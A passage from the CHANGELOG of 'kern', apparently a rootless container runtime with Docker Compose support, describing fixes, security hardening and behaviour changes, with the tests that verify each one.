  150ms of starting" and `up` exited 1, so a stack holding a migration or a build step failed its CI
  run BY SUCCEEDING. Every service is handed the key now. A service that exits non-zero is still
  reported and still fails the command, which the same test asserts, because a fix that stopped
  reporting deaths would have passed the other half.

- **`kern top`'s output muting stole the stdout of the whole process, not of its own work.** The
  helper that runs a lifecycle key with fd 1 and fd 2 pointed at `/dev/null` - so a reused CLI
  command's `println!` cannot corrupt the alt-screen - does that with `dup2`, which rewrites the
  file descriptor table of the PROCESS. `kern top` is single-threaded and never noticed. Its own
  unit tests are not: libtest runs tests on parallel threads and prints from another one, and
  MEASURED, this binary silently dropped up to a hundred lines of its own test report - the
  `test result:` summary among them, in 6 runs out of 8 - while still exiting 0. A failing test
  could have reported into `/dev/null`, and `scripts/test-count.py` had nothing to parse. Two
  overlapping calls could also interleave save and restore and leave fd 1 on `/dev/null` for good.
  The redirect now happens only while the alternate screen is actually up, which is the only thing
  it was ever there to protect. 0 runs out of 12 lose a line now.

- **A NUL byte in a compose file travelled into a value instead of being refused.** U+0001 was
  already barred, but only because it is the YAML reader's private newline sentinel, so the
  neighbouring check read as a general control-byte policy it was not. MEASURED, a U+0000 reached an
  image name intact and printed raw to the operator's terminal. Everything downstream of a compose
  value is a C string or a path, so a NUL is either truncated in silence or refused a long way from
  the file that carries it. Refused at the same door as U+0001, with its own message.

- **A key written twice in one service is refused instead of resolved to the last one.** A YAML
  mapping has no duplicate keys, and two services with one name, or two `x-kern-vcpu` in one service,
  were already refused. `image` was the exception: MEASURED, a second `image` at the bottom of a
  service silently won, which is the cheapest way to make a downloaded file run an image other than
  the one a reader sees at the top. A local key that also exists in a MERGED base is not a duplicate:
  that is what `<<:` is for, and it still wins.

- **A folded block scalar folded breaks it may not fold.** In `>` a line break becomes a space only
  between two lines that are both at the block's indentation; a break next to a MORE-INDENTED line is
  kept. Every break was folded, so an embedded snippet came out as one line: measured, `alp` /
  `<2 spaces>ine` / `fine` became `alp   ine fine`. The service still ran and emitted a different
  text, which is the "runs and lies" shape rather than the "refuses" one.

- **A tab after the colon was refused as if it were indentation.** The rule was "this line has leading
  spaces AND contains a tab anywhere", so `image:<TAB>alpine` was rejected with a message pointing at
  the indentation, and a shell script pasted into a block scalar (which is full of tabs) went the same
  way. Only the indentation prefix is checked now.

- **A TOML multi-line string produced a value nobody wrote.** `image = """alpine"""` removed a
  single pair of quotes and yielded `""alpine""`, carried to a registry that then complained about a
  tag that does not exist. The parser does not implement multi-line strings and now says so, like it
  already did for the literal-string form.

- **An unterminated `${` was silently kept as a literal.** The comment there assumed "a downstream
  parse error will surface if it matters", and MEASURED it does not: `image: "${NONCHIUSA"` parsed
  clean and the image name became the literal text. Kept literal (the same text can appear inside a
  block scalar carrying a shell script, so refusing would reject files that work) and now warned
  about, once per fragment.

- **The pid1 fallback could pick a nested init instead of the box's own.** It looks for a descendant
  that is PID 1 in its own pid namespace, and a box whose WORKLOAD creates a pid namespace has two of
  those: MEASURED with `--privileged` and a workload of `unshare -p --fork`, the supervisor's
  descendants were `NSpid: <p> 1` and `NSpid: <p> 2 1`. Both satisfied the rule, so which one the
  walk returned was an artefact of traversal order rather than a decision, and the deeper one puts
  `exec` inside the workload's namespace and resolves the cgroup through the wrong pid. The rule is
  now the init exactly ONE level below the resolving process - relative, never a constant, because
  inside a container kern is itself nested and a fixed depth would pass here and fail on a CI runner.

- **`kern compose <file> config` reports what each profile name resolved to on THIS host.** A file
  names a grant and does not carry one, so two machines can read one file completely differently:
  measured, `x-kern-vdisk: scratch` against a 64m `scratch` and against a 50g persistent one printed
  the identical `profiles: vdisk:scratch` on both, from the command whose whole job is explaining the
  file. It now prints the caps for a `vcpu`, the size and flags for a `vdisk`, and the device paths
  for a `vgpio`. A profile that resolves to nothing present says so rather than printing a blank.

- **A `kern.toml` key this build does not read is now named.** The parser is deliberately tolerant of
  unknown keys, so a config shared with another kern edition still loads, but tolerance and silence
  are different things: a hand-written `[[vcpu]]` with `cores = 6`, where the key is `cpus`, produced
  a profile that granted nothing and said nothing, and the new resolution output then reported it as
  resolving to the defaults, which reads as success. A warning, never a refusal, deduplicated per key.

- **Every example script now prints which `kern` it resolved, on stderr, before it runs anything.**
  They all use `kern="${KERN:-kern}"`, so a run that forgets to set `KERN` silently measures whatever
  is on `PATH`. That happened here: `examples/compose-declared-ports.sh` was run against the branch,
  passed, and printed the INSTALLED release's older message, which was caught only by recognising the
  text. A validation that measures the wrong binary does not produce a weak result, it produces a
  green one for code that never ran. 81 scripts, one line each: `# using <path> (<version>)`.

- **A health checker that gives up now says so in the record.** The checker exits when its launcher's
  pid stops being that process, and that guard's failure is the quiet one: a wrong mismatch stops
  checking a LIVE box, while `healthy` means "healthy as of the last check" and nothing in the record
  says when that was. A frozen status is indistinguishable from a box that keeps answering the same
  way, so the exit writes `stopped checking: launcher pid changed` first. It writes only OVER a record
  that still exists, never creating one: `kern stop` clears the sidecar from another process, and
  nothing sweeps the health directory.

- **Three parsers accepted a malformed value as a well-formed one, all through the same mistake.**
  `trim_start_matches` strips its argument AS MANY TIMES AS IT FINDS IT, which is almost never what a
  parser means: `x-kern-x-kern-vcpu` was read as the `x-kern-vcpu` key, `on-failure:on-failure:3` as a
  clean retry count of 3, and `0o0o755` as mode 755. All three now `strip_prefix` once, so a malformed
  value falls onto the error or warning that already exists for it rather than being reinterpreted.
  The rule is written down in `CONTRIBUTING.md` beside the other traps, because the family is a grep
  and this is its fourth appearance in the same shape as `parse_binary_size` on `31.2G`.

- **The health checker held its launcher's pid across time without pinning it.** It resolves its box
  every round through that number, and a pid is a number the kernel may hand to someone else. The
  checker is not supposed to outlive its launcher, and MEASURED it does not: a detached box with a
  health check runs one process more than one without, and after the supervisor is SIGKILLed both
  converge to the same count. But that is an argument about how promptly a signal is delivered, and
  the number admits the wrong answer regardless, so the checker now records the launcher's start-time
  at fork and exits when the pid stops being that process. Same rule as the box's own PID 1, one
  process out.

- **The port-collision refusal sent readers to `--no-pod` without saying what it costs.** A stack
  shares one network namespace, so two services cannot both bind one container port, and the refusal
  named two ways out while pricing neither. MEASURED on one two-service stack, `getent hosts db`
  answers `127.0.0.1 db db` in a pod and NOTHING under `--no-pod`, so the second way out traded a
  loud refusal at bring-up for a silent connect failure inside a service, where the reason is
  invisible. The refusal now spells the edit it wants, naming the service to change and a port to
  use, and prices both routes. It also says that `PORT` is a convention rather than a contract: most
  images read it, an image that reads a variable of its own needs that one set instead, and for those
  the two-line edit is two lines plus knowing which variable. `--no-pod` says the same thing itself,
  once per bring-up, when the stack has more than one service (a single service has no peer to lose,
  and a stack in a pod has given nothing up). Verified end to end: two services on the same internal
  port 8080 come up under `--no-pod`, published on 7001 and 7002, both answering, no edit to the
  file, and the edit the refusal dictates does clear it.

- **A `nice` the kernel refuses was accepted, echoed back, and silently dropped.** A field report on
  v0.8.0 found `nice = -5` in a `[[vcpu]]` profile leaving the workload at effective nice 0 with no
  warning at any stage. The profile is only one of the two routes to it: MEASURED, the flag does the
  same, `--nice -5` and `--nice -1` both landing at 0 while `--nice 5` and `--nice 19` take effect.
  `setpriority`'s return value was discarded at both call sites (`kern box` and `kern run`), and
  LOWERING a nice value needs `CAP_SYS_NICE` or `RLIMIT_NICE` headroom, which a rootless box does not
  have by default. One function now applies it and names what happened: a warning naming the errno and
  what would make it work, never a refusal, because raising a nice still works everywhere and a
  scheduling preference is not a boundary. A flag accepted and ignored is the defect; a flag that
  cannot apply and says so is not.

- **A recycled PID could put `exec`, `cp`, `commit`, `stop` and the health probe in a stranger's
  namespaces.** The registry records the box's PID 1 as a bare number, and every consumer that enters
  the box opens `/proc/<pid1>/ns/*` from it. Once the init exits, the kernel may hand that number to an
  unrelated process, and the recorded value stays until the supervisor unregisters. `kern stop`
  signalled it, `pause`/`update` resolved a cgroup from it and wrote there, and `stop` `rmdir`ed a
  cgroup read out of it. The pid's kernel start-time is now recorded beside it - what the registry has
  always done for the supervisor pid, whose field carries the comment "pins the identity of the pid so
  a reused pid can't masquerade as a live box" - and a single accessor is the only way to reach the
  number, falling back to resolving through the start-time-pinned supervisor. A single writer records
  the pair, because the two launch paths each set the pid by hand and only one of them was updated
  first. The pidfd already taken by the restart path does NOT cover this: it faithfully pins whoever
  holds the pid at the moment of the open, stranger included, and closes the TOCTOU after it.

- **`kern compose <file> config` accepted an `x-kern-security-profile` value that `up` would refuse.**
  The same class as the profile entry below, one field over: `x-kern-security-profile: bogus` printed
  a clean preview and exited 0, and `up` then refused with `--security-profile: expected untrusted`.
  `config` now asks the runtime's own vocabulary, so the compose crate still keeps no second copy of
  the list. `config` also prints the profile it read, marked as kern-only, since a hardening bundle
  that is silent in the command that exists to explain the file is a posture taken on trust.

- **`kern compose <file> config` accepted a profile reference that `up` would refuse.** Introduced by
  the keys above: `config` printed `profiles: vgpio:leds` and exited 0 while `up` failed with
  `no [[vgpio]] profile named 'leds'`. This page's own rule is that a dry run which disagrees with
  the bring-up is worse than no dry run, because it is the one people trust before committing a file.
  `config` resolves through `apply_profile_list`, the function `kern box` itself calls, so the two
  cannot drift into disagreeing about what resolves.

- **A missing profile named the file but not the command.** The error pointed at `kern.toml` and the
  docs; the person reading it is the operator who has to create the grant, so it now carries the
  `kern config add <kind>:<name> …` line that does it.

  Injection: verified - removing the resolve loop makes `config` accept a profile that does not
  exist and turns `compose_config_refuses_a_profile_that_up_would_refuse` red. Its positive control
  is that the same file passes once the profile IS declared, so a `config` that refused everything
  could not satisfy it.

- **A foreground box took `--health-cmd` and never evaluated it.** The checker was armed in exactly
  one place, the detached launch path, so a box started without `-d` accepted the flag, exited 0, and
  left `kern ps` showing an empty HEALTH column. No warning, no error.

  NOT A CORNER OF THE CLI, which is why it went unnoticed and why it mattered: `--restart
  always`/`unless-stopped` installs a systemd unit whose `ExecStart` deliberately STRIPS `-d`
  (`Type=simple`, systemd is the supervisor), so EVERY persistent box runs on the foreground path. A
  `kern compose` stack carrying `restart:` under `--no-pod` therefore gated on a status nobody
  computed: `depends_on: condition: service_healthy` waited the full 120 s and failed with
  `last status: 'none yet'` while the service underneath was up and serving. Reported against v0.8.0
  on a four-service stack; measured here from a two-line `kern box` with no compose and no systemd
  involved, which is the smaller and truer statement of the same defect.

  The checker is forked BEFORE the sandbox unshares its pid namespace, for the reason the timeout
  watchdog already documents: a process forked after `unshare(CLONE_NEWPID)` lands inside the box's
  namespace, where it becomes an un-reapable zombie on exit and deadlocks the teardown. It needs
  nothing from PID 1 at fork time, since it re-reads `pid1` from the registry each round.

  Measured end to end: the reported case went from a 120 s timeout to the dependent service starting
  after 7 s.

- **A SIGKILL'd launcher left its health checker probing forever.** Every ordinary exit stops the
  checker, but a SIGKILL runs no teardown at all, and one orphan survived each kill, sleeping and
  probing a box that no longer existed. The box itself never leaked that way because it already
  carries a `PR_SET_PDEATHSIG` link; the checker now carries the same one, with the usual re-read of
  `getppid` after arming to close the fork/prctl race. Measured: one orphan per kill before, zero
  after, on both launch paths.

  The teardown is one function used by both paths rather than a copy in each, because a copy is how
  the two would drift again.

- **The README named the port constraint without naming the way out.** `--no-pod` lifts it entirely
  and was documented only in `docs/DOCKER-COMPAT.md`, so a reader met the constraint in the README,
  renumbered a port, and never learned the flag existed. The trade is stated with it, and measured
  rather than assumed: under `--no-pod` a service no longer resolves another by name.

  Injection: verified on both fixes. Removing the foreground arm returns an empty health status and
  turns `a_foreground_box_evaluates_its_health_check` red; removing the `PDEATHSIG` guard leaves one
  process behind and turns `a_killed_foreground_launcher_takes_its_health_checker_with_it` red. Each
  test carries the detached case as its positive control, in the same run, so neither can pass by
  measuring nothing.

### Security


- **A pid that cannot be a process read as a live one.** The fail-open face of the entry below.
  `kill(0, 0)` probes the caller's own process group and `kill(-1, 0)` probes every process the user
  owns, so both succeed and a liveness probe answers yes; in `registry::is_alive` the start-time
  comparison did not rescue it either, because `/proc/0/stat` is unreadable, `proc_starttime` answers
  0, and the arm that exists so an unreadable start time is not a mismatch then returned true.
  MEASURED before the fix: `is_alive(0, x)` was true, so a registry entry holding 0 named a box that
  read as running, kept its name claimed and counted against the fleet cap. Fixed in the three places
  that probe a recorded pid: the box registry, the pod holder and the pod marker. Found by auditing
  every `kill` call site before tagging, after the entry below fixed the signalling direction.

- **Three helpers could hand `-1` to `kill`, which signals every process the user owns.** Found by
  auditing the change below rather than by a report, and it is older than that change.

  `fork_detached` decided with `child != 0`, so a FAILED fork (-1) came back as `Some(-1)`; the
  `--timeout` watchdog it builds then reached `libc::kill(tp, SIGKILL)`. `spawn_health_checker`
  returned a bare pid with the same shape, and its teardown reached `kill(hp, SIGTERM)`.
  `kill(-1, sig)` is not a no-op and not an error: POSIX sends the signal to every process the caller
  has permission to signal, which for a normal user is their whole session. The trigger is precisely
  a failed fork, that is `EAGAIN` under `RLIMIT_NPROC` or memory pressure - a host already running
  many boxes, not an idle one.

  `Option` could not express the fork-failure state, because `None` already meant "you are the
  child": reporting failure that way would have made the PARENT run the watchdog body and never
  return. The three states are now a `Forked` enum, the two spawners return `Option<i32>`, and every
  helper signal goes through one `signal_helper` that refuses a non-positive pid.

- **`signal_box` could send the stop signal, then `SIGKILL`, to the caller's own process group.** A
  box is registered with `pid1: 0` and re-registered once its init exists. In that window the
  recorded value is 0, `pidfd_open` on it fails so the plain-`kill` fallback is taken, and
  `init_catches_signal` returns `true` for `pid1 <= 0`, so the graceful arm is ENTERED rather than
  skipped. `kill(0, sig)` means the caller's process group, so a `kern stop` landing there would have
  signalled the stopper's own shell. The fallback now requires `pid1 > 0`.

  Injection: verified. Both guards are asserted from a child in its OWN process group (`setsid`
  first), because the failure being tested is "kills my whole group" and running it in the test
  process would take the harness down with it. Removing either guard turns its own test red; the
  positive control is that `signal_helper` still delivers to a live pid, so a version that always
  refuses cannot pass.

## v0.8.0 - 2026-08-31

**This is a MINOR bump (0.8.0), not a patch.** Not because the command surface moved: it did not.
No verb or flag is removed or renamed, `--entrypoint` and compose's `-d` are additive, and the
`cli_surface_is_frozen` snapshot changed only in three description lines. By the letter of the
stability rule above, a patch would have been allowed.

The reason is that **three things that worked can now stop working**, all on existing paths, and a
patch number tells a reader the opposite. kern is installed by a one-liner and by
`cargo install --git`, both of which always take the latest: the version number is not read by a
resolver, it is read by a person deciding whether to look before upgrading. These are what they
would be looking for.

- **A numeric `USER` takes its group from the image's `/etc/passwd`, not from its own number.**
  A box that ran as `1000:1000` now runs as whatever the image declares, and as the ROOT group when
  the image lists no entry for that uid. If a volume holds files written under the old gid, check
  that the service can still write them.
- **An image `USER` the image cannot resolve now refuses to start the box.** It used to run the
  workload as box root after a note on stderr, so a box that STARTED now exits 1. Pass
  `--user <uid[:gid]>` to choose one, or `--user 0` to run as box root on purpose.

  `--user 0` is NOT byte-identical to the old fallback, and the difference is stated rather than
  glossed: measured on the same image, the old path gave
  `uid=0 gid=0 groups=65534(nobody) x12, 0(root)` and `--user 0` gives `uid=0 gid=0` with no
  supplementary groups. Those inherited groups are all the overflow gid inside the box and grant
  nothing, so no permission depends on them, but "the old behaviour" would have been the wrong word
  for it.
- **An image reference the OCI grammar cannot hold is refused where you type it.**
  `kern build -t Foo-BAR:latest` and `kern pull Foo-BAR:latest` used to be accepted and to fail
  later, at push time or against a registry. Lowercase the reference; the error prints the exact
  string to use.

Nothing here had a deprecation entry a release earlier, which the rule above requires for the
COMMAND SURFACE. It is not owed for these, because none of them is a verb, a flag or a `--json`
shape, and it is stated rather than left to be noticed.

### Security

- **Five resource caps on untrusted registry data had no boundary test, and two security predicates
  had no test at all.** Found by mutation sampling rather than by reading: 20 mechanical mutants over
  files that have tests, of which 13 were ones a unit test could have killed and 5 survived - a 38%
  survival rate on reachable sites.

  Two of the five were the file's own defences. `take_data`'s `real_here.min(room)` is the bound that
  holds a returned buffer to `keep` on bytes from a registry; `min` became `max` and 920 tests stayed
  green. `has_bare_lf` is the documented request-smuggling defence; inverting it ACCEPTS the smuggled
  request and REJECTS well-formed CRLF, and nothing reached it because it sat inline in a function
  that takes a socket. It is a pure function now, which is the only shape in which it can be asserted
  in both directions.

  A second, targeted sweep over `vet_tar_stream` then found the pattern rather than the instance:
  8 of 14 mutants died, and FIVE of the six survivors were caps - `MAX_TAIL_BLOCKS`, `TAR_MAX_LONG`
  at three sites, `MAX_LAYER_ENTRIES`. The identity checks in that vetter were covered and not one of
  the limits was, and the limits are the whole defence against a malicious layer rather than a
  malformed one. `valid_allow_entry`'s 253-character FQDN bound was uncovered in the same way.

  MEASURED, NOT ASSUMED: the zero-padding boundary sits at `MAX_TAIL_BLOCKS - 1` extra blocks,
  because the end-of-archive marker's second zero block already enters the tail loop. The test says
  so, so the next reader does not go looking for an off-by-one that is not there.

  THE SAMPLE IS A LOWER BOUND. Sites were drawn only from files that HAVE tests, which excludes by
  construction the files most likely to hold a gap. "38% of sampled testable sites do not
  discriminate" is what was measured; "38% of the code is unprotected" was not.

  The two survivors outside the registry path are closed too. `clamp_cpus` needed its comparison
  EXTRACTED before it could be asserted at all: at `c == host` the clamped result and the unclamped
  one are the same number, so mutating `>` to `>=` leaves every return value untouched and changes
  only the warning - which then tells an operator that N CPUs "exceeds the N available". A false
  message was the entire observable difference. `profiles_table` put the selection marker on every
  row EXCEPT the selected one under `i != sel`, which is the `k`-kills-the-box failure reached from
  the rendering side.

  Injection: verified - every cap and predicate was re-mutated after its test landed; `>` to `>=` on
  the tail cap, on both `TAR_MAX_LONG` sites, on the entry cap and on `cpus_exceed_host`, `min` to
  `max` on the buffer bound, `!=` to `==` on the bare-LF check, `i == sel` to `i != sel` on the
  marker, and `> 253` / `<= 63` on the allowlist bounds. Each turns its own case red. The entry-cap
  case costs 7.1 s in debug because a two-million-member cap can only be asserted by reaching it.

### Changed

- **An image reference the OCI grammar cannot hold is refused where you type it, not where it
  finally breaks.** `kern build -t Foo-BAR:latest` succeeded and put that name in the local cache,
  which no registry will accept, so the refusal arrived at `kern push` after the build was already
  paid for. `kern pull Foo-BAR:latest` was worse: it dialled the registry and came back with
  `registry: no layers in manifest`, a message that names nothing about the actual problem.

  The rule is `kern_oci::valid_reference`, which already rejected uppercase. It was simply not
  consulted on either path, so this restricts nothing new: it applies an existing rule while it can
  still be acted on. When lowercasing is the whole fix, the error prints the exact string to type
  instead, and when it is not, it says nothing rather than suggesting a retype that changes nothing.

  Listed under Changed and not Fixed: a script that built an uppercase tag locally now stops. Docker
  refuses the same input at build with `repository name must be lowercase`, measured against Docker
  29.6.2 on the same host where kern accepted it.

  Injection: verified - removing either call site turns
  `an_image_reference_the_oci_grammar_cannot_hold_is_refused_before_any_work` red, with the parse
  returning `Build { tag: Some("Foo-BAR:latest") }`.

- **`kern compose <file> up -d` used to be a usage error.** `docker compose up -d` is the most
  common way anyone starts a stack, and the flag loop rejected every `-x` it did not know. `-d` and
  `--detach` are accepted now, silently rather than with the "has no effect" note the presentation
  flags get: kern's `up` starts the services and returns, so the flag names exactly what happens and
  the note would have been false. `--ansi`, `--progress`, `--no-ansi`, `--compatibility`,
  `--dry-run` and `--parallel` remain the ones that say they do nothing.

  Injection: verified - removing the arm turns
  `compose_up_accepts_the_detach_flag_because_that_is_what_it_already_does` red, and an unknown flag
  is still refused, which is the control that the arm did not open the gate for everything.

- **A numeric `USER` now takes its group from the image's `/etc/passwd`, not from its own number.**
  Listed here and not under Fixed: from kern's side it is a correction, and from the side of anyone
  running a box that worked - with a volume holding files written under the old gid - it is a
  behaviour change that can break them. A CHANGELOG is read to answer "does this break something of
  mine", and the honest classification is the one that answers that question rather than the one
  that describes the intent.

  Affects every image whose `USER` is numeric AND whose passwd entry declares a different primary
  group. `USER 1000` resolved to `gid 1000`; it now resolves to what the image says, and to the root
  group when the image lists no entry for that uid.

  VERIFIED AGAINST THE IMPLEMENTATION, not against documentation: `moby/sys/user`'s `GetExecUser`
  sets `user.Gid = users[0].Gid` from the matched passwd entry, and leaves `user.Gid` at
  `defaults.Gid` when a numeric uid has no entry - which runc's `libcontainer/init_linux.go` sets to
  `0`. The earlier claim rested on prose; this is the code that runs.

  `quay.io/keycloak/keycloak:26.1` declares `USER 1000` with `keycloak:x:1000:0:` and lays its tree
  out as `drwxrwxr-x root root`. With gid 1000 the process could not write its own installation,
  Quarkus' startup augmentation failed to write into its runner JAR, `jdk.nio.zipfs` reported the
  JAR as a read-only zip filesystem, and the box restart-looped on a `ReadOnlyFileSystemException`
  naming nothing about permissions. A field report attributed it to tmpfs exhaustion; reproduced
  here with 3.2 GB free, which ruled that out. The image now starts:
  `Keycloak 26.1.5 … started in 3.693s. Listening on: http://0.0.0.0:8080`.

  THE FIRST CORPUS FOR THIS WAS WORTHLESS AND IS RECORDED SO IT IS NOT REPEATED. Six official images
  were run and all answered `0:0` under both rules, because not one declares a `USER`: the check was
  never reached. It would have stayed green with the fix inverted. The corpus that replaced it was
  built to discriminate - `1000:0`, `1000:2000`, and a uid absent from passwd - and gives 1000/1000/1000
  under the old rule against 0/2000/0 under the new one, on three built images across two built
  binaries.

  Injection: verified - `Ok(n) => (n, n)` restored, and the always-0 variant; both turn
  `a_numeric_user_takes_its_primary_group_from_the_images_passwd` red on the discriminating rows.

  It moves box start onto a file read per box, which is why it was measured: 400 runs per side on an
  image that declares a `USER`, medians 3.5 ms on both, minima 2.8 against 2.9. That is a cost BELOW
  THE NOISE FLOOR of this measurement, which is not the same as no cost and is not claimed as one.

- **An image `USER` the image cannot resolve now refuses to start the box, as Docker does.** It used
  to run the workload as box root after printing a note on stderr, so that an odd image still
  started. That is the wrong shape of failure: an image whose entire purpose is to drop privilege got
  the opposite of what it asked for, and the only evidence was one line printed above the workload's
  own output. A field test reported the behaviour as "ran as 0:0, not an error" without mentioning
  the note at all, which is the argument against a warning in that position, demonstrated rather than
  asserted. Docker refuses the same input (`unable to find user X: no matching entries in passwd
  file`), and kern reads its user spec by Docker's rules everywhere else on that path.

  The escape hatch is not removed, it is made explicit: `--user 0` runs as box root on purpose, and
  an explicit `--user` still overrides an image whose own `USER` is unresolvable. Nothing changes for
  an image whose `USER` resolves, which is every image that works today; the check is in
  `resolve_run_as`, so the decision is asserted without an image on disk.

  Injection: verified - restoring the fallback turns
  `an_unresolvable_image_user_fails_closed_instead_of_running_as_box_root` red. Measured end to end:
  `USER 1000:nosuchgroup` and `USER nobodyhere` now exit 1, a resolvable `USER 1000` still gives
  `1000:0`, and `--user 0` still gives `0:0`.

- `kern doctor` no longer tells you to write `cgroup.subtree_control` where you have no permission to
  write it. It now says which of the two things is in the way, measured on the cgroup a box would be
  capped in.
- The uncapped-box warning names `XDG_RUNTIME_DIR` only when pointing it somewhere else would change
  the answer. On a host with no user manager at all it says so instead.
- The `no systemd user manager here` line in `doctor` says what that costs and what it prevents, so it
  no longer reads as good news one row under the warning that caps do not bind.

### Fixed

- **`kern <typo> --help` printed the whole reference and exited 0.** `kern frobnicate` on its own
  had always answered `unknown command`; asking for help about it was the one spelling that hid the
  mistake, and a reader could not tell a typo from a real verb with no section of its own.

  "Found no lines in the reference" could not be the test, and that was measured rather than
  assumed: `install` and `docker` also fall through to the full page, and neither is a verb
  (`kern install` and `kern docker` each answer `unknown command`; the docker shim is argv0 only).
  The parser is its own oracle now, so there is no second list of verbs to keep in step: the bare
  verb is parsed and only `UnknownCommand` is treated as a spelling problem. A verb that needs
  arguments, or a compose file that is not in this directory, still gets help.

  Injection: verified - removing the check turns the test red with
  `Ok((GlobalOpts, HelpFor("frobnicate")))`. Non-regression measured across all 48 verbs the
  reference lists plus the eight real ones outside it: none lost its help.

- **A `kern config add` that failed had already changed your config file.** The physical block a
  profile needs is materialised BEFORE the profile is validated, so a refusal landed after the
  write. Measured: on a config whose `[[cpu]]` is named `host`, `kern config add vcpu:big --cpus 4`
  printed `id 'host' is the reserved backend`, exited 1, and had already appended a
  `[[cpu]] id = "cpu:0"` nobody asked for.

  Not data loss, and said plainly because the difference matters: the write is idempotent, so three
  failed attempts left one block and not three, and the resulting file still validates. What was
  wrong is narrower and still worth fixing: a command that reports failure may not leave the
  operator's file changed, and the next person to open it finds a block with no history.

  The file is snapshotted only when something is about to be materialised, and restored to exactly
  that: a file this command did not touch is not rewritten, and a file that did not exist before is
  removed rather than left empty.

  Injection: verified - removing the restore turns `a_refused_config_add_leaves_the_file_byte_identical`
  red with the appended block visible in the byte diff. The comparison is byte for byte and not by
  parsing, because a parse agrees on the two files this is about.
- **The macOS CI job tested one of the installer's two branches and could not tell them apart.**
  `install.sh` says something different to a Mac that already runs a Linux VM: use the one you have,
  do not install a second. Which branch a bare run takes depends on what the runner image happens to
  ship, so the job could not assert which message it had seen, and its one content check,
  `grep -q colima`, matched in BOTH branches (`brew install colima` in one, `colima ssh` in the
  other). It would have stayed green with the branches swapped.

  Both branches are driven from a built PATH now. `PATH=/usr/bin:/bin` was not it: `docker` sits in
  `/usr/bin` on plenty of systems, so "no VM here" would have been a property of the runner image
  rather than of the test. The environment holds a `sh` and a `uname` and nothing else, and the job
  asserts it is empty of VM tools before using it. The assertion that separates the branches is the
  ABSENCE of `brew install` from the message a Mac with a VM gets, which is that branch's entire
  reason to exist, and the control is that the two runs must differ at all.

  The refusal is also written as `if`, not `grep -q X && { exit 1; }`: a run step is `bash -e`, and
  in an AND-OR list only the last command is exempt from `-e`, so a grep that correctly finds
  nothing would have failed the step exactly when the product was right.

  Injection: verified - collapsing the installer's VM probe to `have=""` makes the has-a-VM
  assertions red under a simulated Darwin, and both branches then print the same text, which the
  control catches on its own.

- **`kern --help` did not name the values `--status` takes, the compose `-d` it now accepts, or
  `--profile`.** The vocabulary of `builds --status` was reachable only by typing something wrong
  and reading the usage error. Audited rather than spotted: every long flag the parser matches was
  compared against everything `--help` prints, in both directions. The reverse direction is clean,
  nothing is promised that kern refuses, and of the flags absent from the help, three are internal
  and documented as such in the source (`--def-hash`, `--overlay-lower`, `--overlay-upper`) and nine
  are long aliases of documented short forms.


- **The container-only port warning quoted port 8000 whatever the file said.** A stack declaring only
  `9090` was told about a port that appears nowhere in it, so the sentence read as an observation
  when it was an example. A field test had to isolate the case to establish that kern was not
  carrying stale state from another file before it could dismiss it. The note names the port that
  triggered it, and `warn_once` now dedupes per distinct port rather than per file.

  Injection: verified - restoring the fixed sentence turns
  `the_container_only_port_note_names_the_port_the_file_declared` red.

- **`kern doctor` reported a missing `/etc/subuid` allocation that was there.** The lookup
  interpolated `$USER` into the pattern it searched for, so with the variable unset it looked for
  lines beginning with `":"` and matched nothing: a host with `newuidmap` installed and
  `root:100000:65536` in the file was told that `--uid-range`, non-root `--user` and `--ssh` would
  fall back to a single-uid map, and handed a `sudo tee` line to add an allocation it already had.
  `USER` is not set for a daemon, a container, `sudo` without `-E`, or many CI runners, and this is
  the first command an operator runs.

  The identity now comes from `getuid` plus `/etc/passwd`, and BOTH spellings shadow-utils accepts
  are matched: the login name, which is what `useradd` writes, and the numeric uid. The environment
  is not consulted at all, which also retires the last use of a variable that had already produced a
  command-injection defect in this same function.

  Injection: verified - restoring the previous `doctor.rs` and running `env -u USER kern doctor` on a
  host whose allocation exists reproduces the false warning, with the wrong hint (`echo
  1000:100000:65536 ...` while `alex:100000:65536` was already present). Reported from the field
  against the `dev` branch.

- **`kern builds --status interrupted` listed builds that the same command printed as `running`.**
  `running` and `interrupted` are one stored status told apart only by asking whether the process is
  still there, and the filter compared the STORED status, so either word selected every unfinished
  record. Asking for interrupted builds returned the one that was building at that moment.

  The filter is answered by `Record::label`, the same call that fills the STATUS column, so the query
  and the column cannot disagree. This is the same shape as the defect it sits beside: a condition
  derived in two places drifts.

  Injection: verified - restoring the stored-status comparison turns
  `the_status_filter_selects_by_the_word_the_status_column_prints` red with
  `left: ["inflight", "abandoned"]`. Reported from the field against the `dev` branch.

- **The flat build's base copy now names what it costs and why.** `copy_tree` passes
  `--reflink=auto`, which clones the base on btrfs/xfs/bcachefs and silently falls back to a full
  byte copy everywhere else - `auto` is defined not to complain. That one property decides whether a
  flat build of a 2 GB base costs milliseconds or minutes, and nothing said which one you had. The
  build line and `kern doctor` both state it now.

  Injection: verified - dropping the probe's cleanup turns
  `the_reflink_probe_answers_and_leaves_nothing_behind` red.

  Measured while evaluating a field report's suggestion to "cache the flattened base rootfs per
  image": kern already does that, at pull time - the image cache IS a flattened rootfs, with no
  layer chain to merge - and an unchanged rebuild is already skipped
  (`[cached · flat image unchanged]`, 0.00 s). What remains is the writable copy, which cannot be a
  hardlink farm without a RUN step corrupting the shared cache, and cannot be an overlay because the
  flat path exists precisely where overlay is unavailable. On this ext4 host `cp --reflink=always`
  is refused and a 2.1 GB base copies in 0.86 s with the source in page cache - a LOWER BOUND, since
  the caches cannot be dropped without privilege. The reporter's 2m49s is WSL2's filesystem, not a
  repeated flattening.

- **The README's compatibility promise now carries the constraint that qualifies it.** The
  shared-namespace rule - two services in one stack cannot both listen on the same container port -
  lived only in `docs/DOCKER-COMPAT.md`, while the README said `read as-is`, "with no conversion
  step" and `# a real stack, unchanged` under the heading *"Your Docker Compose stack, without
  Docker Desktop"*. A heading takes no clause, and the possessive claimed every reader's file, so
  that one is now *"Docker Compose files, without Docker Desktop"* with the constraint in the
  paragraph under it and in the comparison row.

  Injection: none - prose only. The behaviour it now describes is asserted elsewhere
  (`cli_surface_is_frozen`, and the port-collision entry below).

  The Status line said the CLI surface can still change. That has been false since v0.7.0: the
  CHANGELOG declares it stable and `cli_surface_is_frozen` holds the build to a committed snapshot.
  Config-file keys, which no gate freezes, keep the caveat.

- **A refused port collision named the box, not the service.** `services 'myapp-keycloak' and
  'myapp-api' both listen on container port 8080/tcp` for a file whose services are `keycloak` and
  `api`, because both checks read `ComposeBox::name` after it has been rewritten to the box name.
  Injection: verified - restoring `b.name` in either check turns
  `the_collision_message_names_the_services_the_file_declares` red; both were tried separately.

